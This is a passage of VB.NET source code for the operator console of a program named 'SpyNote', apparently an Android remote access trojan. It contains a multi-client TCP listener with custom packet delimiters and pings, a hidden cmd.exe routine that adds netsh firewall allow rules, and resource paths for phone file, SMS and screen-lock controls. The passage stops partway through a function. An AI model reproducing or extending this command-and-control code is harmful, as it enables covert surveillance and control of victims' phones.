﻿Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.Drawing.Drawing2D
Imports System.Threading

#Region " Protocol TCP "
Public Class SocketServer
    Public ListenerTCP As New List(Of TcpListener), Clients() As Socket, RemotesAddress() As String, Online As New List(Of Integer)
    Private MaxClients% = 0, i% = -1, Infinity% = -1, Buffer% = Integer.MaxValue
    Public Syn$ = "c2x2824x828200x0c"
    Public Split_Packets$ = "b4x7004x700x4b"
    Public SplitData$ = "fxf0x4x4x0fxf"
    Public split_Ary$ = "c0c1c3a2c0c1c"
    Public split_Line$ = "9xf89fff9xf89"
    Public split_paths$ = "e1x1114x61114e"
    Public Event log_S(ByVal NClient%, ByVal Data_0$, ByVal errors_0$)
    Public Event Data(ByVal NClient%, ByVal Data_0$, ByVal id_0$, ByVal NAClient_0$)
    Public Event DisConnected(ByVal NClient%)
    Public Event Connected(ByVal NClient%)
    Public Event title(ByVal Online_L$, ByVal getAlPorts$, ByVal refP$)
    Public Event wiatLst(ByVal ls As Boolean)
    Public TcpState As Boolean = True
    Public BytesSent As Long = 0
    Public BytesReceived As Long = 0
    '    Long Kb = 1 * 1024
    '    Long Mb = Kb * 1024
    '    Long Gb = Mb * 1024  '1073741824 '  gb
    '    Long Tb = Gb * 1024
    '    Long Pb = Tb * 1024
    '    Long Eb = Pb * 1024
    Function Start(ByVal Port As String) As Boolean
        Try
            ListenerTCP.Clear()
            TcpState = True : i = -1
            MaxClients = My.Settings.Maximum_Clients
            ReDim Clients(MaxClients) : ReDim RemotesAddress(MaxClients)
            Dim OFP As System.Threading.Thread = New Threading.Thread(AddressOf store_0.Open_firewall_port)
            OFP.IsBackground = True
            OFP.Start(Port)
            Dim ary$() = Port.Trim.Split(",")
            For Each prt In ary
                If IsNumeric(prt) Then
                    Try
                        If TcpState = False Then GoTo nex
                        Dim MyTcpListener = New TcpListener(Net.IPAddress.Any, CInt(prt))
                        ListenerTCP.Add(MyTcpListener)
                        ListenerTCP(ListenerTCP.Count - 1).Server.SendTimeout = Infinity
                        ListenerTCP(ListenerTCP.Count - 1).Server.ReceiveTimeout = Infinity
                        ListenerTCP(ListenerTCP.Count - 1).Server.ReceiveBufferSize = Buffer
                        ListenerTCP(ListenerTCP.Count - 1).Server.SendBufferSize = Buffer
                        ListenerTCP(ListenerTCP.Count - 1).Start()
                        RaiseEvent log_S(-1, "Listener", "Active " + CStr(prt))
                    Catch ex As Exception
                        MsgBox(ex.Message, MsgBoxStyle.Critical, store_0.name_prog + " [" + CStr(prt) + "]<Port")
                        RaiseEvent log_S(-1, "Listener", "Not Active " + CStr(prt) + Space(1) + ex.Message)
                        CloseAllServers()
                        GoTo nex
                    End Try
                Else
                    CloseAllServers()
                    GoTo nex
                End If
            Next
            Dim a As System.Threading.Thread = New Threading.Thread(AddressOf accept)
            a.IsBackground = True
            a.Start()
            Form1.Icon = store_0.icons_0("window")
            RaiseEvent title(CStr(Online.Count.ToString), GetPortsAllServers, "x-x")
            Return True
        Catch ex As Exception
            'MsgBox(ex.ToString)
            CloseAllServers()
        End Try
nex:
        Return False
    End Function
    Public Sub CloseAllServers()
        Try
            If ListenerTCP.ToArray.Length > 0 Then
                For a% = 0 To ListenerTCP.Count - 1
                    Dim strPort$ = CStr(CType(ListenerTCP(a).Server.LocalEndPoint, IPEndPoint).Port.ToString())
                    ListenerTCP(a).Server.Close()

                    RaiseEvent log_S(-1, "Listener", "This Port is closed  >" + strPort)
                Next
                ListenerTCP.Clear()
                RaiseEvent wiatLst(False)
                RaiseEvent title(CStr(Online.Count.ToString), GetPortsAllServers, "x-x")
            End If
        Catch ex As Exception
            'MsgBox(ex.ToString)
        End Try
    End Sub
    Public Function GetPortsAllServers()
        Try
            If TcpState Then
                Dim b As New StringBuilder
                For Each lste In ListenerTCP
                    b.Append((CType(lste.LocalEndpoint, IPEndPoint).Port.ToString() + ","))
                Next
                If Not b.ToString.Length <= 0 Then
                    Return b.ToString.Remove(b.ToString.Length - 1).ToString
                Else
                    Return "-1"
                End If
            Else
                Return "-1"
            End If
        Catch ex As Exception
            Return "-1"
        End Try
    End Function
    Sub Send(ByVal i%, ByVal str$)
        If TcpState Then
            Send_0(i, store_0.Encoding_0.GetBytes(Space(1) + Syn + str + Syn))
        End If
    End Sub
    Sub Send_0(ByVal i%, ByVal byte_0 As Byte())
        Dim thread As New Thread(Sub()
                                     If TcpState Then
                                         Try
                                             Dim myNetworkStream As New NetworkStream(Clients(i))
                                             If myNetworkStream.CanWrite Then
                                                 Dim numberOfBytesWrite As Integer = byte_0.Length
                                                 BytesSent += numberOfBytesWrite
                                                 myNetworkStream.Write(byte_0, 0, byte_0.Length)
                                                 myNetworkStream.Flush()
                                             End If

                                         Catch ex As Exception
                                             'MsgBox(ex.ToString)
                                         End Try
                                     End If
                                 End Sub)
        thread.Start()
    End Sub
    Private Function new_Client() As Integer
        While (TcpState) : Threading.Thread.Sleep(store_0.CPU)
            If Not TcpState = False Then
                If i + 1 >= Clients.Length - 1 Then i = -1
                i += 1
                SyncLock Online
                    If Online.Contains(i) = False Then
                        Online.Add(i)
                        Threading.Thread.Sleep(store_0.CPU)
                        RaiseEvent title(CStr(Online.Count.ToString), GetPortsAllServers, "x-x")
                        Return CInt(i.ToString.Clone)
                    End If
                End SyncLock
                If Online.Count >= Clients.Length - 1 Then
                    Exit While
                End If
            Else
                Exit While
            End If
        End While
        Return -1
    End Function
    Private Sub accept()
        While (TcpState) : Threading.Thread.Sleep(store_0.CPU)
            If TcpState Then
                Try
                    Dim i_0%
                    For Each lste In ListenerTCP
                        If lste.Pending Then
                            If Not Online.Count - 1 >= Clients.Length - 1 Then
                                i_0 = new_Client()
                                If TcpState = False Then GoTo nx
                                Clients(i_0) = lste.AcceptSocket
                                Dim Asy As System.Threading.Thread = New Threading.Thread(AddressOf Pending)
                                Asy.IsBackground = True
                                Asy.Start(i_0)
                            End If
                        End If
                    Next
                Catch ex As Exception
                    'MsgBox(ex.Message)
                End Try
            End If
        End While
nx:
        Exit Sub
    End Sub
    Private Sub Pending(i%)
        Try
            If TcpState Then
                If Not Online.Count - 1 >= Clients.Length - 1 Then
                    If TcpState = False Then GoTo nx

                    Clients(i).ReceiveBufferSize = Buffer
                    Clients(i).SendBufferSize = Buffer
                    Clients(i).ReceiveTimeout = Infinity
                    Clients(i).SendTimeout = Infinity

                    If TcpState = False Then GoTo nx
                    Dim RecI As System.Threading.Thread = New Threading.Thread(AddressOf Receive)
                    RecI.IsBackground = True
                    RecI.Start(i)
                    If TcpState = False Then GoTo nx
                    RaiseEvent log_S(i, "Connected", Nothing)
                    Threading.Thread.Sleep(2 * 1000)
                    If TcpState = False Then GoTo nx
                    RaiseEvent Connected(i)
                Else
                    Exit Sub
                End If
            End If
        Catch ex As Exception
            Exit Sub
        End Try
nx:
        Exit Sub
    End Sub
    Dim dis_0 As Object = New Object
    Public Sub Disconnect(ByVal i%, ByVal Erro$)

        SyncLock dis_0

            Try
                If Online.Contains(i) = True Then
                    RaiseEvent log_S(i, "DisConnected", Erro)
                    Online.Remove(i)
                    RaiseEvent title(CStr(Online.Count.ToString), GetPortsAllServers, "x-x")
                    Try
                        Clients(i).Disconnect(False)
                        Clients(i).Close()
                        Clients(i).Dispose()
                        Clients(i) = Nothing
                        RaiseEvent DisConnected(i)
                    Catch ex As Exception

                    End Try


                End If
            Catch ex As Exception
            End Try
        End SyncLock
    End Sub
    Private Sub yPing(ByVal i%)
        Do
            Thread.Sleep(30 * 1000)
            Send(i, "ping")
        Loop While (TcpState)
    End Sub
    Private Sub Receive(ByVal i%)
        Dim setping As System.Threading.Thread = New Threading.Thread(AddressOf yPing)
        setping.IsBackground = True
        setping.Start(i)
        Dim Erro$ = Nothing
        If TcpState = False Then GoTo nx
        Dim myNetworkStream As New NetworkStream(Clients(i))
        While (TcpState) : Threading.Thread.Sleep(store_0.CPU)
            Try
                If TcpState = False Then GoTo nx
                If Clients(i) IsNot Nothing Then
                    If TcpState = False Then GoTo nx
                    If Clients(i).Connected Then
                        If myNetworkStream.CanRead Then
                            Dim myCompleteMessage As StringBuilder = New StringBuilder()
                            Dim numberOfBytesRead As Integer = 0
                            While (TcpState) : Threading.Thread.Sleep(store_0.CPU)
                                If TcpState = False Then GoTo nx
                                Dim intNumRxBytes As Integer = Clients(i).Available
                                Dim myReadBuffer(intNumRxBytes - 1) As Byte
                                '|>> STOP here

                                numberOfBytesRead = myNetworkStream.Read(myReadBuffer, 0, myReadBuffer.Length)
                                myCompleteMessage.AppendFormat("{0}", store_0.Encoding_0.GetString(myReadBuffer, 0, numberOfBytesRead))
                                BytesReceived += numberOfBytesRead


                                If myCompleteMessage.ToString().Contains(Syn) Then

                                    If myCompleteMessage.ToString().StartsWith(Syn) Then

                                        If myCompleteMessage.ToString().EndsWith(Syn) Then

                                            Dim Synspl() As String = {Syn}
                                            Dim Array1() As String = (myCompleteMessage.ToString()).Split(Synspl, StringSplitOptions.None)
                                            For Each spld In Array1
                                                If (spld.ToString()).Contains(Split_Packets) Then
                                                    Dim split_data() As String = {Split_Packets}
                                                    Dim Array() As String = (spld.ToString()).Split(split_data, StringSplitOptions.None)
                                                    If Array.Length = 3 Then

                                                        RaiseEvent Data(i, Array(0), Array(1), Array(2))
                                                    End If
                                                End If
                                            Next
                                            Exit While
                                        End If
                                    End If
                                End If
                            End While
                        Else
                            Erro = "Sorry.  You cannot read from this NetworkStream." + " (55)"
                            Exit While
                        End If
                        myNetworkStream.Flush()
                    Else
                        Erro = "Not Connected" + " (56)"
                        Exit While
                    End If
                Else
                    Erro = "Empty" + " (57)"
                    Exit While
                End If
            Catch ex As Exception
                Erro = ex.Message + " (53)"
                Exit While
            End Try
        End While
nx:

        Try

            Disconnect(i, Erro)
        Catch ex As Exception
        End Try
    End Sub
    Public Function getRemote_Address(ByRef i%, ByRef s_o%) As String
        If TcpState Then
            Try
                Select Case s_o
                    Case 0
                        RemotesAddress(i) = Clients(i).RemoteEndPoint.ToString().Split(":")(0)
                        Return RemotesAddress(i)
                    Case 1
                        RemotesAddress(i) = Clients(i).RemoteEndPoint.ToString().Split(":")(0) + " & " + CType(Clients(i).LocalEndPoint, IPEndPoint).Port.ToString()
                        Return RemotesAddress(i)
                    Case Else
                        Return "0.0.0.0:0"
                End Select
            Catch ex As Exception
                Return "0.0.0.0:0"
            End Try
        Else
            Return "0.0.0.0:0"
        End If
    End Function
    Public Sub endserver(z%)
        RaiseEvent log_S(-1, "DisConnected", "Disconnect all clients, waiting for the port to close")
        TcpState = False
        For a% = 0 To Online.Count
            If Online.Contains(a) = True Then
                Disconnect(a, Nothing)
            End If
        Next
        Online.Clear()
        i = -1
        CloseAllServers()
        If z = 0 Then
            Try
                End
            Catch : Finally
                End
            End Try
        End If
    End Sub
End Class
#End Region
Public Module store_0
    Public name_prog$ = "SpyNote", name_folder_app_resource$ = "App_Resources"
    Public CPU% = 1

#Region " Priority "
    Public Sub myProcessPreference()
        Try
            Dim myProcess As System.Diagnostics.Process = System.Diagnostics.Process.GetCurrentProcess()

            ' ProcessPriorityClass.RealTime الوقت الحقيقي
            ' ProcessPriorityClass.High عالي
            ' ProcessPriorityClass.AboveNormal اعلى من العادي
            ' ProcessPriorityClass.Normal عايدي
            ' ProcessPriorityClass.BelowNormal اقل من العادي
            ' ProcessPriorityClass.Idle منخفض
            Select Case CInt(My.Settings.Process_Priority)
                Case 0
                    myProcess.PriorityClass = System.Diagnostics.ProcessPriorityClass.RealTime
                Case 1
                    myProcess.PriorityClass = System.Diagnostics.ProcessPriorityClass.High
                Case 2
                    myProcess.PriorityClass = System.Diagnostics.ProcessPriorityClass.AboveNormal
                Case 3
                    myProcess.PriorityClass = System.Diagnostics.ProcessPriorityClass.Normal
                Case 4
                    myProcess.PriorityClass = System.Diagnostics.ProcessPriorityClass.BelowNormal
                Case 5
                    myProcess.PriorityClass = System.Diagnostics.ProcessPriorityClass.Idle
                Case Else
                    myProcess.PriorityClass = System.Diagnostics.ProcessPriorityClass.Normal
            End Select

        Catch : End Try

    End Sub
#End Region
#Region " Country matrices "
    Public CountryName As String() = {"N/A", "Asia/Pacific Region", "Europe", "Andorra", "United Arab Emirates", "Afghanistan", "Antigua and Barbuda", "Anguilla", "Albania", "Armenia", "Netherlands Antilles", "Angola", "Antarctica", "Argentina", "American Samoa", "Austria", "Australia", "Aruba", "Azerbaijan", "Bosnia and Herzegovina", "Barbados", "Bangladesh", "Belgium", "Burkina Faso", "Bulgaria", "Bahrain", "Burundi", "Benin", "Bermuda", "Brunei Darussalam", "Bolivia", "Brazil", "Bahamas", "Bhutan", "Bouvet Island", "Botswana", "Belarus", "Belize", "Canada", "Cocos (Keeling) Islands", "Congo, The Democratic Republic of the", "Central African Republic", "Congo", "Switzerland", "Cote D'Ivoire", "Cook Islands", "Chile", "Cameroon", "China", "Colombia", "Costa Rica", "Cuba", "Cape Verde", "Christmas Island", "Cyprus", "Czech Republic", "Germany", "Djibouti", "Denmark", "Dominica", "Dominican Republic", "Algeria", "Ecuador", "Estonia", "Egypt", "Western Sahara", "Eritrea", "Spain", "Ethiopia", "Finland", "Fiji", "Falkland Islands (Malvinas)", "Micronesia, Federated States of", "Faroe Islands", "France", "France, Metropolitan", "Gabon", "United Kingdom", "Grenada", "Georgia", "French Guiana", "Ghana", "Gibraltar", "Greenland", "Gambia", "Guinea", "Guadeloupe", "Equatorial Guinea", "Greece", "South Georgia and the South Sandwich Islands", "Guatemala", "Guam", "Guinea-Bissau", "Guyana", "Hong Kong", "Heard Island and McDonald Islands", "Honduras", "Croatia", "Haiti", "Hungary", "Indonesia", "Ireland", "Israel", "India", "British Indian Ocean Territory", "Iraq", "Iran, Islamic Republic of", "Iceland", "Italy", "Jamaica", "Jordan", "Japan", "Kenya", "Kyrgyzstan", "Cambodia", "Kiribati", "Comoros", "Saint Kitts and Nevis", "Korea, Democratic People's Republic of", "Korea, Republic of", "Kuwait", "Cayman Islands", "Kazakstan", "Lao People's Democratic Republic", "Lebanon", "Saint Lucia", "Liechtenstein", "Sri Lanka", "Liberia", "Lesotho", "Lithuania", "Luxembourg", "Latvia", "Libyan Arab Jamahiriya", "Morocco", "Monaco", "Moldova, Republic of", "Madagascar", "Marshall Islands", "Macedonia, the Former Yugoslav Republic of", "Mali", "Myanmar", "Mongolia", "Macao", "Northern Mariana Islands", "Martinique", "Mauritania", "Montserrat", "Malta", "Mauritius", "Maldives", "Malawi", "Mexico", "Malaysia", "Mozambique", "Namibia", "New Caledonia", "Niger", "Norfolk Island", "Nigeria", "Nicaragua", "Netherlands", "Norway", "Nepal", "Nauru", "Niue", "New Zealand", "Oman", "Panama", "Peru", "French Polynesia", "Papua New Guinea", "Philippines", "Pakistan", "Poland", "Saint Pierre and Miquelon", "Pitcairn", "Puerto Rico", "Palestinian Territory, Occupied", "Portugal", "Palau", "Paraguay", "Qatar", "Reunion", "Romania", "Russian Federation", "Rwanda", "Saudi Arabia", "Solomon Islands", "Seychelles", "Sudan", "Sweden", "Singapore", "Saint Helena", "Slovenia", "Svalbard and Jan Mayen", "Slovakia", "Sierra Leone", "San Marino", "Senegal", "Somalia", "Suriname", "Sao Tome and Principe", "El Salvador", "Syrian Arab Republic", "Swaziland", "Turks and Caicos Islands", "Chad", "French Southern Territories", "Togo", "Thailand", "Tajikistan", "Tokelau", "Turkmenistan", "Tunisia", "Tonga", "Timor-Leste", "Turkey", "Trinidad and Tobago", "Tuvalu", "Taiwan, Province of China", "Tanzania, United Republic of", "Ukraine", "Uganda", "United States Minor Outlying Islands", "United States", "Uruguay", "Uzbekistan", "Holy See (Vatican City State)", "Saint Vincent and the Grenadines", "Venezuela", "Virgin Islands, British", "Virgin Islands, U.S.", "Vietnam", "Vanuatu", "Wallis and Futuna", "Samoa", "Yemen", "Mayotte", "Yugoslavia", "South Africa", "Zambia", "Montenegro", "Zimbabwe", "Anonymous Proxy", "Satellite Provider", "Other", "Aland Islands", "Guernsey", "Isle of Man", "Jersey", "Saint Barthelemy", "Saint Martin"}
    Public CountryCode As String() = {"N/A", "AP", "EU", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AN", "AO", "AQ", "AR", "AS", "AT", "AU", "AW", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BM", "BN", "BO", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK", "CL", "CM", "CN", "CO", "CR", "CU", "CV", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO", "DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "FX", "GA", "GB", "GD", "GE", "GF", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW", "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IN", "IO", "IQ", "IR", "IS", "IT", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ", "LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX", "MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA", "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN", "SO", "SR", "ST", "SV", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TM", "TN", "TO", "TL", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC", "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "SAU", "RS", "ZA", "ZM", "ME", "ZW", "A1", "A2", "O1", "AX", "GG", "IM", "JE", "BL", "MF"}
    Public CountryNump As String() = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "40", "41", "42", "43", "44", "45", "46", "47", "48", "49", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59", "60", "61", "62", "63", "64", "65", "66", "67", "68", "69", "70", "71", "72", "73", "74", "75", "76", "77", "78", "79", "80", "81", "82", "83", "84", "85", "86", "87", "88", "89", "90", "91", "92", "93", "94", "95", "96", "97", "98", "99", "100", "101", "102", "103", "104", "105", "106", "107", "108", "109", "110", "111", "112", "113", "114", "115", "116", "117", "118", "119", "120", "121", "122", "123", "124", "125", "126", "127", "128", "129", "130", "131", "132", "133", "134", "135", "136", "137", "138", "139", "140", "141", "142", "143", "144", "145", "146", "147", "148", "149", "150", "151", "152", "153", "154", "155", "156", "157", "158", "159", "160", "161", "162", "163", "164", "165", "166", "167", "168", "169", "170", "171", "172", "173", "174", "175", "176", "177", "178", "179", "180", "181", "182", "183", "184", "185", "186", "187", "188", "189", "190", "191", "192", "193", "194", "195", "196", "197", "198", "199", "200", "201", "202", "203", "204", "205", "206", "207", "208", "209", "210", "211", "212", "213", "214", "215", "216", "217", "218", "219", "220", "221", "222", "223", "224", "225", "226", "227", "228", "229", "230", "231", "232", "233", "234", "235", "236", "237", "238", "239", "240", "241", "242", "243", "244", "245", "246", "247", "248", "249", "250", "251", "252", "253", "254"}
#End Region
#Region " Functions Encoding "
    Function Encoding_0() As Encoding
        Select Case My.Settings.Data_encoding
            Case 0


                Return System.Text.Encoding.Default
            Case 1
                Return System.Text.Encoding.UTF7
            Case 2
                Return System.Text.Encoding.UTF8
            Case 3
                Return System.Text.Encoding.UTF32
            Case 4
                Return System.Text.Encoding.Unicode
            Case 5
                Return System.Text.Encoding.ASCII
            Case 6
                Return System.Text.Encoding.BigEndianUnicode
            Case Else
                Return System.Text.Encoding.Default
        End Select


        ''    'Default = 0
        ''    'UTF7 = 1
        ''    'UTF8 = 2
        ''    'UTF32 = 3
        ''    'Unicode = 4
        ''    'ASCII = 5
        ''    'BigEndianUnicode = 6

    End Function

#End Region
#Region " Check if admin "
    Public Function IF_Admin()
        Try
            If My.User.IsInRole(ApplicationServices.BuiltInRole.Administrator) Then
                Return True
            Else
                Return False
            End If
        Catch
            Return False
        End Try
    End Function
#End Region

#Region " firewall_port "
    Public Sub Open_firewall_port(port_01 As String)
        Try



            If IF_Admin() Then
                Dim b As New StringBuilder
                Dim ary$() = port_01.Trim.Split(",")
                For Each prt In ary
                    If IsNumeric(prt) Then
                        b.Append(prt + ",")
                    Else
                        GoTo nx
                    End If
                Next
                b.ToString.Remove(b.ToString.Length - 1)

                Dim cmd_0 As ProcessStartInfo = New ProcessStartInfo("cmd.exe")
                Dim Process_0 As Process
                cmd_0.CreateNoWindow = True
                cmd_0.UseShellExecute = False
                cmd_0.RedirectStandardInput = True
                cmd_0.RedirectStandardOutput = True
                Process_0 = Process.Start(cmd_0)

                'delete
                Process_0.StandardInput.WriteLine("netsh advfirewall firewall delete rule name=" + "" + name_prog + "")
                If My.Settings.Protocol_tcp = 1 Then
                    'in -tcp
                    Process_0.StandardInput.WriteLine("netsh advfirewall firewall add rule name=" + "" + name_prog + "" + " dir=in action=allow protocol=TCP localport=" + b.ToString)
                    'out -tcp
                    Process_0.StandardInput.WriteLine("netsh advfirewall firewall add rule name=" + "" + name_prog + "" + " dir=out action=allow protocol=TCP localport=" + b.ToString)
                End If
                If My.Settings.Protocol_udp = 1 Then
                    'in -udp
                    Process_0.StandardInput.WriteLine("netsh advfirewall firewall add rule name=" + "" + name_prog + "" + " dir=in action=allow protocol=UDP localport=" + b.ToString)
                    'out -udp
                    Process_0.StandardInput.WriteLine("netsh advfirewall firewall add rule name=" + "" + name_prog + "" + " dir=out action=allow protocol=UDP localport=" + b.ToString)
                End If

                Process_0.StandardInput.Close()
            End If
        Catch ex As Exception
            'MsgBox(ex.ToString)
        End Try

nx:
        Exit Sub

    End Sub
#End Region

#Region " ContextMenu "
    Public WithEvents ContextMenu1 As ContextMenuStrip
    Public WithEvents Cut_0, Copy_0, Paste_0, select_all_0, Undo_0 As ToolStripMenuItem
    Public Sub Menu_Items()
        Cut_0 = New ToolStripMenuItem
        Copy_0 = New ToolStripMenuItem
        Paste_0 = New ToolStripMenuItem
        select_all_0 = New ToolStripMenuItem
        Undo_0 = New ToolStripMenuItem


        Cut_0.ImageScaling = ToolStripItemImageScaling.None
        Copy_0.ImageScaling = ToolStripItemImageScaling.None
        Paste_0.ImageScaling = ToolStripItemImageScaling.None
        select_all_0.ImageScaling = ToolStripItemImageScaling.None
        Undo_0.ImageScaling = ToolStripItemImageScaling.None

        Cut_0.Image = store_0.Bitmap_0("ctx_cut")

        Copy_0.Image = store_0.Bitmap_0("ctx_copy")

        Paste_0.Image = store_0.Bitmap_0("ctx_paste")


        Cut_0.Text = "Cut"
        Copy_0.Text = "Copy"
        Paste_0.Text = "Paste"
        select_all_0.Text = "Select All"
        Undo_0.Text = "Undo"
        ContextMenu1 = New ContextMenuStrip
        ContextMenu1.Items.Add(Cut_0)
        ContextMenu1.Items.Add(Copy_0)
        ContextMenu1.Items.Add(Paste_0)
        ContextMenu1.Items.Add(select_all_0)
        ContextMenu1.Items.Add(Undo_0)
        ContextMenu1.RenderMode = System.Windows.Forms.ToolStripRenderMode.System
        ContextMenu1.Renderer = New Theme_0
    End Sub
    Private Sub Cut_0_Click(sender As Object, e As System.EventArgs) Handles Cut_0.Click
        Dim curContextMenu As ContextMenuStrip = DirectCast(DirectCast(sender, ToolStripItem).Owner, ContextMenuStrip)
        Dim curRTB As RichTextBox = DirectCast(curContextMenu.SourceControl, RichTextBox)
        curRTB.Cut()
    End Sub
    Private Sub Copy_0_Click(sender As Object, e As System.EventArgs) Handles Copy_0.Click
        Dim curContextMenu As ContextMenuStrip = DirectCast(DirectCast(sender, ToolStripItem).Owner, ContextMenuStrip)
        Dim curRTB As RichTextBox = DirectCast(curContextMenu.SourceControl, RichTextBox)
        curRTB.Copy()
    End Sub
    Private Sub Paste_0_Click(sender As Object, e As System.EventArgs) Handles Paste_0.Click
        Dim curContextMenu As ContextMenuStrip = DirectCast(DirectCast(sender, ToolStripItem).Owner, ContextMenuStrip)
        Dim curRTB As RichTextBox = DirectCast(curContextMenu.SourceControl, RichTextBox)
        curRTB.Paste()
    End Sub
    Private Sub select_all_0_Click(sender As Object, e As System.EventArgs) Handles select_all_0.Click
        Dim curContextMenu As ContextMenuStrip = DirectCast(DirectCast(sender, ToolStripItem).Owner, ContextMenuStrip)
        Dim curRTB As RichTextBox = DirectCast(curContextMenu.SourceControl, RichTextBox)
        curRTB.SelectAll()
    End Sub
    Private Sub Undo_0_Click(sender As Object, e As System.EventArgs) Handles Undo_0.Click
        Dim curContextMenu As ContextMenuStrip = DirectCast(DirectCast(sender, ToolStripItem).Owner, ContextMenuStrip)
        Dim curRTB As RichTextBox = DirectCast(curContextMenu.SourceControl, RichTextBox)
        curRTB.Undo()
    End Sub
#End Region
#Region " icons "
    Public Function icons_0(cas As String) As Icon
        Try
            Select Case cas
                Case "window"
                    Dim wn As New Icon(Application.StartupPath & "\" & name_folder_app_resource & "\icons\icon_window\ic_Server.ico")
                    Return wn
                Case "window_error"
                    Dim wn As New Icon(Application.StartupPath & "\" & name_folder_app_resource & "\icons\icon_window\ic_ServerErr.ico")
                    Return wn
                Case "errors"
                    Dim wn As New Icon(Application.StartupPath & "\" & name_folder_app_resource & "\icons\icon_diverse\errors.ico")
                    Return wn
            End Select
        Catch ex As Exception
            'MsgBox(ex.ToString)
        End Try
        Return Nothing
    End Function
    Public Function Bitmap_0(cas As String) As Bitmap
        Try
            Select Case cas
                Case "img_0"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\about\img_0.psd")
                    Return wn
                Case "chevron_right"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\icon_diverse\chevron_right.png")
                    Return wn
                Case "chevron_left"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\icon_diverse\chevron-left.png")
                    Return wn
                Case "icon_default"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\icon_diverse\icon_default.png")
                    Return wn
                    '\\\
                Case "bluetooth"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\phone_bar\bluetooth.png")
                    Return wn
                Case "gps"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\phone_bar\gps.png")
                    Return wn
                Case "mobile_data"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\phone_bar\mobile_data.png")
                    Return wn
                Case "normal"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\phone_bar\normal.png")
                    Return wn
                Case "silent"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\phone_bar\silent.png")
                    Return wn
                Case "vibrate"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\phone_bar\vibrate.png")
                    Return wn
                Case "wifi_connected"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\phone_bar\wifi_connected.png")
                    Return wn
                Case "wifi_disconnected"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\phone_bar\wifi_disconnected.png")
                    Return wn
                Case "Key&ScreenOn"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\phone_lock\Key&ScreenOn.png")
                    Return wn
                Case "Key&ScreenOff"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\phone_lock\Key&ScreenOff.png")
                    Return wn
                Case "ScreenOn"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\phone_lock\ScreenOn.png")
                    Return wn
                Case "ScreenOff"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\phone_lock\ScreenOff.png")
                    Return wn
                Case "null"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\phone_lock\null.png")
                    Return wn

                Case "Rotate180"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\icon_diverse\Rotate180.png")
                    Return wn


                Case "wp"
                    Dim wn As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\wp\null.png")
                    Return wn

                Case "ri_arr"
                    Dim arr As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\icon_diverse\ri_arr.png")
                    Return arr
                Case "li_arr"
                    Dim arr As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\icon_diverse\li_arr.png")
                    Return arr


                Case "dow_xxx"
                    Dim arr As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\icon_diverse\dow.png")
                    Return arr
                Case "up_xxx"
                    Dim arr As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\icon_diverse\up.png")
                    Return arr



                    '\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
                Case "ctx_file_manager"
                    Dim ctx As New Bitmap(Application.StartupPath & "\" & name_folder_app_resource & "\icons\ctx_menu\f.png")
                    Return ctx
                Case "ctx_sms_manager"
